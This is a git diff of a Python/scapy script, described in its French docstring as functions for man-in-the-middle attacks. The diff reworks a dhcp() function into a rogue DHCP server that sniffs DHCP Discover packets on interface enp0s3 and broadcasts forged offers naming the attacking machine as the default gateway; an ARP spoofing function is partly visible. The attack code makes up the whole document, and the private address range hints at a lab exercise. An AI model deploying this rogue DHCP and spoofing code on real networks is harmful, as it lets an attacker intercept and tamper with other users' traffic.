@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
 '''Fichier contenant les fonctions permetant de realiser des attaques MiTM'''
-from scapy.all import ARP,Ether, DHCP, IP, UDP, BOOTP, sendp, srp, sniff, hexdump, get_if_addr
+from scapy.all import ARP,Ether, DHCP, IP, UDP, BOOTP, sendp, srp, sniff, hexdump, get_if_addr, get_if_hwaddr
 from time import sleep
 from sys import argv
 
@@ -32,12 +32,18 @@ def arp(ipa:str, ipb:str)->None:
     sleep(5) #Arrete le processus durant X secondes
 
 def dhcp():
-  ip = get_if_addr('enp0s3')
+  ip_src = get_if_addr('enp0s3')
+  mac_src = get_if_hwaddr('enp0s3')
   def dhcp_reply(paquet):
-      if DHCP in paquet and paquet[DHCP].options[0][1] == 3:
-        reply = Ether(dst = paquet[Ether].src) / IP(dst = paquet[IP].src) / UDP(dport=68, sport=67) / BOOTP(op=2, yiaddr="192.168.56.80") / DHCP(options=[("message-type", "offer"), ('subnet_mask', '255.255.255.0'),('router', f'{ip}')])
-        sendp(reply, iface='enp0s3')
-        return(hexdump(reply[DHCP]), reply[DHCP])
+    if DHCP in paquet and paquet[DHCP].options[0][1] == 1:
+      eth = Ether(src=mac_src)
+      ip = IP(src = ip_src, dst="255.255.255.255")
+      udp = UDP(dport=68, sport=67)
+      bootp = BOOTP(op=2, yiaddr="192.168.56.80", xid=paquet[BOOTP].xid)
+      dhcp = DHCP(options=[("message-type", "offer"), ('subnet_mask', '255.255.255.0'),('router', f'{ip_src}'), ("end")])
+      reply_offer =  eth / ip / udp / bootp / dhcp
+      sendp(reply_offer, iface='enp0s3')
+      return(reply_offer.show())
 
   sniff(prn=dhcp_reply,
     filter="udp and port 68" , iface='enp0s3')
